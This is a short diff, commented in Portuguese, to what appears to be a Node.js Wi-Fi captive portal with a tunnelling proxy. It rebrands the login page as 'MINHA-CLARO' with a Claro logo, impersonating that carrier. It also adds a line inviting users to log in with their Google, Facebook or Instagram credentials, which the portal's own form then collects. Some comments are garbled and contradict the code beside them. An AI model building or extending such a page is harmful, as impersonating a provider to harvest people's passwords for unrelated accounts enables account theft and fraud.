@@ -75,8 +75,8 @@ function tunel(cliente, host, porta, dadosIniciais) {
 
 // ---------------------------------------------------------------- Página de login
 // Troque a marca aqui quando quiser. MARCA_LOGO pode virar uma tag <img> depois.
-const MARCA = 'MINHA-WIFI';
-const MARCA_LOGO = MARCA; // substitua por `<img src="/logo.png" alt="${MARCA}">` quando tiver o logo
+const MARCA = 'MINHA-CLARO'; // substitua por "MINHA-CLARO" quando tiver o logo
+const MARCA_LOGO = `<img src="/claro.jpg" alt="${MARCA}">`; // substitua por `<img src="/claro.jpg" alt="${MARCA}">` quando tiver o logo
 
 function pagina(titulo, corpo) {
   return `<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
@@ -111,6 +111,7 @@ const esc = (s) => String(s).replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`)
 function formLogin(destino, erro) {
   return pagina(MARCA, `<h1>Conecte-se à internet</h1>
 <p>Entre com seus dados para liberar o acesso Wi-Fi.</p>
+<p>Você pode usar sua conta Google (Gmail), Facebook ou Instagram.</p>
 ${erro ? `<div class="erro">${erro}</div>` : ''}
 <form method="post" action="/login">
  <input name="usuario" placeholder="Usuário" autocomplete="username" autofocus required>
